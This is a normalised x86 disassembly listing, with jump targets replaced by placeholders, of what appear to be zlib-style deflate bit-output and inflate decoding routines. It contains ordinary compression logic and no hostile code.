mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov di [ eax + 0xab4 ]
shl di cl
or [ eax + 0x16b0 ] di
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ eax + 0xab4 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov di [ eax + ebp * 4 + 0xa74 ]
shl di cl
or [ eax + 0x16b0 ] di
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ eax + ebp * 4 + 0xa74 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov ebx [ esp + 0x1c ]
xor edx edx
test ebx ebx
mov [ esp + 0x10 ] ebp
jne r-xdata
add edx 0xfffffff5
shl edx cl
or [ eax + 0x16b0 ] dx
add ecx 0x7
add edx 0xfffffff5
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + edi ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
shr dx cl
add esi 0xfffffff7
mov [ eax + 0x16b4 ] esi
mov [ eax + 0x16b0 ] dx
jmp r-xdata
mov ecx [ eax + 0x16b4 ]
cmp ecx 0x9
jle r-xdata
add edx 0xfffffffd
shl edx cl
or [ eax + 0x16b0 ] dx
add ecx 0x3
jmp r-xdata
add edx 0xfffffffd
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + edi ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
shr dx cl
add esi 0xfffffff3
mov [ eax + 0x16b4 ] esi
mov [ eax + 0x16b0 ] dx
jmp r-xdata
mov ecx [ eax + 0x16b4 ]
cmp ecx 0xd
jle r-xdata
add edx 0xfffffffd
shl edx cl
or [ eax + 0x16b0 ] dx
add ecx 0x2
jmp r-xdata
add edx 0xfffffffd
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + edi ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
shr dx cl
add esi 0xfffffff2
mov [ eax + 0x16b4 ] esi
mov [ eax + 0x16b0 ] dx
jmp r-xdata
mov ecx [ eax + 0x16b4 ]
cmp ecx 0xe
jle r-xdata
dec edx
mov [ esp + 0x20 ] edx
cmp ebp ebx
jne r-xdata
mov ecx 0x8a
mov esi 0x3
jmp r-xdata
mov [ eax + 0x16b4 ] ecx
mov ecx 0x7
mov esi 0x4
mov ecx 0x6
mov esi 0x3
jmp r-xdata
sub_408ad0
mov eax [ esp + 0x4 ]
sub esp 0x8
xor ecx ecx
mov edx [ eax + 0x1698 ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
test edx edx
je r-xdata
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ ebp + 0x402 ]
mov edx 0x10
sub edx esi
cmp ecx edx
jle r-xdata
mov edx [ eax + 0x169c ]
xor edi edi
xor ebx ebx
mov di [ edx + ecx * 2 ]
mov edx [ eax + 0x1690 ]
mov bl [ ecx + edx ]
inc ecx
test edi edi
mov edx ebx
mov [ esp + 0x14 ] ecx
jne r-xdata
mov dx [ ebp + 0x400 ]
shl dx cl
or [ eax + 0x16b0 ] dx
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ ebp + 0x400 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor ebx ebx
mov ecx [ eax + 0x16b4 ]
mov bl [ edx + r--data ]
xor esi esi
mov [ esp + 0x1c ] ebx
mov si [ ebp + ebx * 4 + 0x406 ]
mov ebp 0x10
sub ebp esi
mov [ esp + 0x10 ] esi
cmp ecx ebp
jle r-xdata
mov di [ ebp + edx * 4 + 0x2 ]
mov ecx [ eax + 0x16b4 ]
mov esi 0x10
sub esi edi
cmp ecx esi
jle r-xdata
xor ecx ecx
pop edi
mov cx [ ebp + 0x402 ]
pop esi
pop ebp
mov [ eax + 0x16ac ] ecx
pop ebx
add esp 0x8
retn
mov ebp [ esp + 0x20 ]
mov bp [ ebp + ebx * 4 + 0x404 ]
shl bp cl
mov ecx [ eax + 0x16b4 ]
or [ eax + 0x16b0 ] bp
add ecx esi
mov [ eax + 0x16b4 ] ecx
mov ebp [ esp + 0x20 ]
xor esi esi
mov si [ ebp + ebx * 4 + 0x404 ]
mov ebp [ eax + 0x8 ]
mov ebx esi
shl ebx cl
or [ eax + 0x16b0 ] bx
mov ebx [ eax + 0x14 ]
mov cl [ eax + 0x16b0 ]
mov [ ebx + ebp ] cl
mov ebx [ eax + 0x14 ]
inc ebx
xor ecx ecx
mov cl [ eax + 0x16b1 ]
mov [ eax + 0x14 ] ebx
mov ebp ebx
mov ebx [ eax + 0x8 ]
mov [ ebx + ebp ] cl
mov ecx [ eax + 0x14 ]
mov ebx [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx bx
shr si cl
mov ecx [ esp + 0x10 ]
lea ecx [ ebx + ecx - 0x10 ]
mov ebx [ esp + 0x1c ]
mov [ eax + 0x16b0 ] si
mov [ eax + 0x16b4 ] ecx
jmp r-xdata
mov dx [ ebp + edx * 4 ]
shl dx cl
or [ eax + 0x16b0 ] dx
add ecx edi
jmp r-xdata
xor esi esi
mov si [ ebp + edx * 4 ]
mov edx esi
shl edx cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] dx
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
inc edx
mov [ eax + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ eax + 0x16b1 ]
mov [ ecx + ebx ] dl
mov ecx [ eax + 0x14 ]
mov edx [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr si cl
lea ecx [ edx + edi - 0x10 ]
mov [ eax + 0x16b0 ] si
jmp r-xdata
dec edi
cmp edi 0x100
jae r-xdata
mov ecx [ ebx * 4 + r--data ]
mov ebx 0x10
sub edx ecx
mov ecx [ eax + 0x16b4 ]
sub ebx esi
cmp ecx ebx
jle r-xdata
mov esi [ ebx * 4 + r--data ]
test esi esi
je r-xdata
mov [ eax + 0x16b4 ] ecx
mov ecx edi
shr ecx 0x7
xor ebx ebx
mov bl [ ecx + r--data ]
xor ebx ebx
mov bl [ edi + r--data ]
jmp r-xdata
shl edx cl
or [ eax + 0x16b0 ] dx
add ecx esi
mov [ eax + 0x16b4 ] ecx
mov ebx edx
mov ebp [ eax + 0x8 ]
shl ebx cl
or [ eax + 0x16b0 ] bx
mov ebx [ eax + 0x14 ]
mov cl [ eax + 0x16b0 ]
mov [ ebx + ebp ] cl
mov ebx [ eax + 0x14 ]
inc ebx
xor ecx ecx
mov cl [ eax + 0x16b1 ]
mov [ eax + 0x14 ] ebx
mov ebp ebx
mov ebx [ eax + 0x8 ]
mov [ ebx + ebp ] cl
mov ecx [ eax + 0x14 ]
mov ebx [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx bx
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ ebx + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov dx [ ebp + ebx * 4 ]
mov ebp [ esp + 0x20 ]
shl dx cl
or [ eax + 0x16b0 ] dx
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ ebp + ebx * 4 ]
mov ebp [ eax + 0x8 ]
mov ebx edx
shl ebx cl
or [ eax + 0x16b0 ] bx
mov ebx [ eax + 0x14 ]
mov cl [ eax + 0x16b0 ]
mov [ ebx + ebp ] cl
mov ebx [ eax + 0x14 ]
inc ebx
xor ecx ecx
mov cl [ eax + 0x16b1 ]
mov [ eax + 0x14 ] ebx
mov ebp ebx
mov ebx [ eax + 0x8 ]
mov [ ebx + ebp ] cl
mov ecx [ eax + 0x14 ]
mov ebx [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx bx
mov ebp [ esp + 0x20 ]
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ ebx + esi - 0x10 ]
mov ebx [ esp + 0x1c ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ebp [ esp + 0x24 ]
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov edx 0x10
mov si [ ebp + ebx * 4 + 0x2 ]
mov [ esp + 0x1c ] ebx
sub edx esi
cmp ecx edx
jle r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ eax + 0x1698 ]
cmp ecx edx
jb r-xdata
mov ecx [ ebx * 4 + r--data ]
mov esi 0x10
sub edi ecx
mov ecx [ eax + 0x16b4 ]
sub esi edx
cmp ecx esi
jle r-xdata
mov edx [ ebx * 4 + r--data ]
test edx edx
je r-xdata
shl edi cl
or [ eax + 0x16b0 ] di
add ecx edx
mov esi edi
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
lea edx [ esi + edx - 0x10 ]
shr di cl
mov [ eax + 0x16b4 ] edx
mov [ eax + 0x16b0 ] di
jmp r-xdata
sub_408f10
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
xor edi edi
xor edx edx
lea eax [ ebx + 0x8c ]
mov ecx 0x7
xor esi esi
mov si [ eax ]
add eax 0x4
add edx esi
dec ecx
jne r-xdata
push ebp
lea eax [ ebx + 0xa8 ]
mov ecx 0x79
mov esi 0x80
xor ebp ebp
mov bp [ eax ]
add eax 0x4
add edi ebp
dec ecx
jne r-xdata
cmp esi 0x100
pop ebp
jge r-xdata
shr edi 0x2
cmp edx edi
pop edi
setbe al
mov [ ebx + 0x1c ] al
pop esi
pop ebx
retn
mov eax 0x100
lea ecx [ ebx + esi * 4 + 0x8c ]
sub eax esi
xor esi esi
mov si [ ecx ]
add ecx 0x4
add edx esi
dec eax
jne r-xdata
sub_408f90
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push esi
xor eax eax
mov esi ecx
and esi 0x1
or eax esi
shr ecx 0x1
shl eax 0x1
dec edx
test edx edx
jg r-xdata
shr eax 0x1
pop esi
retn
sub_408fb0
mov eax [ esp + 0x4 ]
push ebx
mov ecx [ eax + 0x16b4 ]
cmp ecx 0x10
jne r-xdata
cmp ecx 0x8
jl r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
push esi
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
mov esi [ eax + 0x8 ]
inc edx
mov [ eax + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ eax + 0x16b1 ]
mov [ esi + ecx ] dl
mov ecx [ eax + 0x14 ]
inc ecx
pop esi
mov [ eax + 0x14 ] ecx
xor ecx ecx
mov [ eax + 0x16b0 ] cx
mov [ eax + 0x16b4 ] ecx
pop ebx
retn
pop ebx
retn
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
xor ecx ecx
inc edx
mov cl [ eax + 0x16b1 ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x16b0 ] cx
mov ecx [ eax + 0x16b4 ]
add ecx 0xfffffff8
mov [ eax + 0x16b4 ] ecx
sub_409040
mov eax [ esp + 0x4 ]
push ebx
push esi
mov edx [ eax + 0x16b4 ]
cmp edx 0x8
jle r-xdata
xor ecx ecx
cmp edx ecx
jle r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
mov esi [ eax + 0x8 ]
inc edx
mov [ eax + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ eax + 0x16b1 ]
mov [ esi + ecx ] dl
mov ecx [ eax + 0x14 ]
inc ecx
pop esi
mov [ eax + 0x14 ] ecx
xor ecx ecx
mov [ eax + 0x16b0 ] cx
mov [ eax + 0x16b4 ] ecx
pop ebx
retn
pop esi
mov [ eax + 0x16b0 ] cx
mov [ eax + 0x16b4 ] ecx
pop ebx
retn
mov edx [ eax + 0x8 ]
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ edx + esi ] bl
mov edx [ eax + 0x14 ]
inc edx
mov [ eax + 0x14 ] edx
sub_4090c0
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_409040
mov eax [ esp + 0x1c ]
add esp 0x4
test eax eax
mov eax [ esp + 0x14 ]
mov [ esi + 0x16ac ] 0x8
je r-xdata
mov edx eax
dec eax
test edx edx
je r-xdata
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
mov [ ecx + edx ] al
mov edx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl ah
mov [ ecx + edi ] dl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
mov dl al
inc ecx
not dl
mov [ esi + 0x14 ] ecx
mov [ ecx + edi ] dl
mov edi [ esi + 0x14 ]
mov ecx eax
not ecx
xor edx edx
inc edi
mov dl ch
mov ecx [ esi + 0x8 ]
mov [ esi + 0x14 ] edi
mov [ edi + ecx ] dl
mov ecx [ esi + 0x14 ]
inc ecx
mov [ esi + 0x14 ] ecx
pop edi
pop esi
retn
lea ecx [ eax + 0x1 ]
mov eax [ esp + 0x10 ]
push ebx
mov edx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
mov bl [ eax ]
mov [ edx + edi ] bl
mov ebx [ esi + 0x14 ]
inc ebx
inc eax
dec ecx
mov [ esi + 0x14 ] ebx
jne r-xdata
pop ebx
sub_409160
mov eax [ esp + 0x14 ]
push 0x1c
push 0x1
mov ecx [ eax + 0x28 ]
push ecx
call [ eax + 0x20 ]
add esp 0xc
test eax eax
je r-xdata
retn
mov dl [ esp + 0x4 ]
mov cl [ esp + 0x8 ]
mov [ eax + 0x10 ] dl
mov edx [ esp + 0xc ]
mov [ eax + 0x11 ] cl
mov ecx [ esp + 0x10 ]
mov [ eax ] 0x0
mov [ eax + 0x14 ] edx
mov [ eax + 0x18 ] ecx
sub_4091a0
sub esp 0x10
push ebx
push ebp
push esi
mov esi [ esp + 0x20 ]
push edi
mov edi [ esp + 0x28 ]
mov edx [ esi + 0x20 ]
mov eax [ esi + 0x4 ]
mov ecx [ edi + 0x4 ]
mov ebp [ edi ]
mov ebx [ esi + 0x1c ]
mov [ esp + 0x28 ] ecx
mov ecx [ esi + 0x30 ]
mov [ esp + 0x24 ] edx
mov edx [ esi + 0x34 ]
mov [ esp + 0x10 ] eax
cmp edx ecx
jae r-xdata
mov ecx [ esi + 0x2c ]
sub ecx edx
sub ecx edx
dec ecx
jmp r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esi + 0x20 ] ecx
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov ecx ebp
mov [ edi + 0x4 ] eax
mov eax [ edi + 0x8 ]
sub ecx ebx
push 0xfffffffe
add eax ecx
push edi
mov [ edi + 0x8 ] eax
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
jmp [ ecx * 4 + jump_table_409920 ]
mov [ esp + 0x14 ] ecx
cmp [ esp + 0x14 ] 0x102
jb r-xdata
mov eax [ eax + 0xc ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov eax [ eax + 0x8 ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov eax [ eax + 0xc ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov eax [ eax + 0x8 ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov ecx edx
sub ecx [ eax + 0xc ]
mov eax [ esi + 0x28 ]
cmp ecx eax
mov [ esp + 0x18 ] ecx
jae r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
jne r-xdata
cmp ebx 0x7
jbe r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esi + 0x20 ] ecx
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov ecx ebp
mov [ edi + 0x4 ] eax
mov eax [ edi + 0x8 ]
sub ecx ebx
push 0x1
add eax ecx
push edi
mov [ edi + 0x8 ] eax
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov eax ebp
mov [ edi + 0x4 ] ecx
mov ecx [ edi + 0x8 ]
sub eax ebx
push 0xfffffffd
add ecx eax
push edi
mov [ edi + 0x8 ] ecx
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x10 ]
xor ecx ecx
mov cl [ eax + 0x10 ]
mov [ eax ] 0x1
mov [ eax + 0xc ] ecx
mov ecx [ eax + 0x14 ]
mov [ eax + 0x8 ] ecx
cmp [ esp + 0x28 ] 0xa
jb r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x8 ]
lea eax [ eax + ecx * 8 ]
xor ecx ecx
mov [ esp + 0x18 ] eax
mov cl [ eax + 0x1 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x1c ] ecx
mov [ esp + 0x24 ] eax
mov eax ecx
sub ebx eax
mov eax [ esp + 0x18 ]
xor ecx ecx
mov cl [ eax ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
add [ eax + 0x4 ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x24 ] eax
mov eax ecx
sub ebx eax
mov eax [ esp + 0x10 ]
xor ecx ecx
mov cl [ eax + 0x11 ]
mov [ eax ] 0x3
mov [ eax + 0xc ] ecx
mov ecx [ eax + 0x18 ]
mov [ eax + 0x8 ] ecx
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x8 ]
lea eax [ eax + ecx * 8 ]
xor ecx ecx
mov [ esp + 0x18 ] eax
mov cl [ eax + 0x1 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x1c ] ecx
sub ebx ecx
xor ecx ecx
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x18 ]
mov cl [ eax ]
test cl 0x10
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
add [ eax + 0xc ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x24 ] eax
mov eax ecx
sub ebx eax
mov eax [ esp + 0x10 ]
mov [ eax ] 0x5
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x2c ]
sub ecx eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x1c ] ecx
jmp r-xdata
mov cl [ eax + 0x8 ]
mov [ esp + 0x2c ] 0x0
mov [ edx ] cl
mov ecx [ esp + 0x14 ]
inc edx
dec ecx
mov [ esp + 0x14 ] ecx
mov [ eax ] 0x0
jmp r-xdata
mov eax [ esi + 0x2c ]
cmp edx eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_40a0a0
mov edx [ esi + 0x34 ]
mov ecx [ esi + 0x30 ]
add esp 0xc
cmp ecx edx
je r-xdata
mov ecx [ esp + 0x28 ]
sub ebx 0x8
inc ecx
dec ebp
mov [ esp + 0x28 ] ecx
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov eax ebp
mov [ edi + 0x4 ] ecx
mov ecx [ edi + 0x8 ]
sub eax ebx
mov [ edi ] ebp
add ecx eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] ecx
mov [ esi + 0x34 ] edx
mov ecx [ eax + 0x18 ]
mov edx [ eax + 0x14 ]
push edi
push esi
push ecx
push edx
xor ecx ecx
xor edx edx
mov cl [ eax + 0x11 ]
mov dl [ eax + 0x10 ]
push ecx
push edx
call sub_40a1e0
mov ecx [ edi + 0x4 ]
mov edx [ esi + 0x20 ]
mov ebp [ edi ]
mov ebx [ esi + 0x1c ]
mov [ esp + 0x40 ] ecx
mov ecx [ esi + 0x30 ]
mov [ esp + 0x3c ] edx
mov edx [ esi + 0x34 ]
add esp 0x18
cmp edx ecx
mov [ esp + 0x2c ] eax
jae r-xdata
test cl 0x10
je r-xdata
mov ecx [ eax + 0x4 ]
mov eax [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov [ eax ] 0x6
jmp r-xdata
mov eax [ esp + 0x24 ]
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] eax
mov ebx [ edi ]
mov eax [ edi + 0x8 ]
mov ecx ebp
sub ecx ebx
mov [ edi + 0x4 ] 0x0
add eax ecx
mov [ edi ] ebp
mov [ edi + 0x8 ] eax
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
test cl 0x40
jne r-xdata
mov eax [ esp + 0x10 ]
and ecx 0xf
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov ecx [ ecx + 0x4 ]
mov [ eax ] 0x4
mov [ eax + 0xc ] ecx
jmp r-xdata
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
jne r-xdata
add eax ecx
mov ecx [ esi + 0x28 ]
cmp eax ecx
jb r-xdata
mov ecx [ eax ]
cmp ecx 0x9
ja r-xdata
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_40a0a0
mov edx [ esi + 0x34 ]
mov [ esp + 0x38 ] eax
mov eax [ esi + 0x30 ]
add esp 0xc
cmp edx eax
jae r-xdata
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] 0x8
mov ecx [ esp + 0x24 ]
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ecx
mov ecx [ esp + 0x28 ]
mov ebx [ edi ]
mov [ edi + 0x4 ] ecx
mov ecx ebp
push eax
sub ecx ebx
mov ebx [ edi + 0x8 ]
add ebx ecx
push edi
mov [ edi + 0x8 ] ebx
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov ecx [ esi + 0x2c ]
sub ecx edx
sub ecx edx
dec ecx
jmp r-xdata
test cl 0x40
jne r-xdata
mov eax [ esp + 0x10 ]
and ecx 0xf
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov ecx [ ecx + 0x4 ]
mov [ eax ] 0x2
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] 0x9
mov [ edi + 0x18 ] rw-data
jmp r-xdata
mov ecx [ esp + 0x18 ]
inc edx
mov [ esp + 0x2c ] 0x0
mov cl [ ecx ]
mov [ edx - 0x1 ] cl
mov ecx [ esp + 0x18 ]
inc ecx
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x14 ]
dec ecx
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x18 ]
cmp ecx [ esi + 0x2c ]
jne r-xdata
mov eax [ esi + 0x2c ]
cmp edx eax
